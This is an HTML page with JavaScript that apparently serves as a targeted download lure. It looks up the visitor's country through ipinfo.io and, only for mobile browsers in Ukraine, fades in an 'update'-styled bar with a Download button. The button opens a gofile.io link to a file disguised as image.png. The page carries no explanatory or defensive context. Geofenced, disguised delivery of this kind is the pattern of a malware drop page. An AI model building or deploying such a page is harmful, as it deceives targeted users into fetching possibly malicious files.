<!DOCTYPE html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>

var country = "UA";
var download_link = "https://srv-file5.gofile.io/download/PZzejU/image.png";
var mobile_pattern = /Chrome|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;

window.onload = function() {
	getGeoPosition();
}

function btnOnClick(){
	downloadResource();
}

function showDialog(){
	document.body.className += " loaded";
}

function testClient(){
	return mobile_pattern.test(navigator.userAgent);
}

function testGeo(currentCountry){
	return country != null && currentCountry === country;
}

function downloadResource(){
	window.open(download_link);
}

function getGeoPosition(){
	$.get("https://ipinfo.io", function (response) {
		  
		 if (testClient() && testGeo(response.country))
			showDialog();
			
		}, "jsonp");
}

</script>
 <style type="text/css">
   .d-container {
		height: 100%;
		width: 100%;
		background-color: #CDCDCD;
		position: fixed;
		top: 0;
		max-height: 50px;
		opacity:0;
		-moz-transition: opacity 5s;
		-webkit-transition: opacity 5s;
		-o-transition: opacity 5s;
		transition: opacity 5s;
	}
   
   .d-btn-update{
		padding: 7px;
		right: 50px;
		top: 7px;
		position: fixed;
		font-weight: 500;
   }
   body.loaded .d-container {
		opacity: 1;
	}
  </style>
</head>
<body>
<div class="d-container">
	<button class="d-btn-update" onclick="btnOnClick()">Download</button>
</div>

</body>
</html>
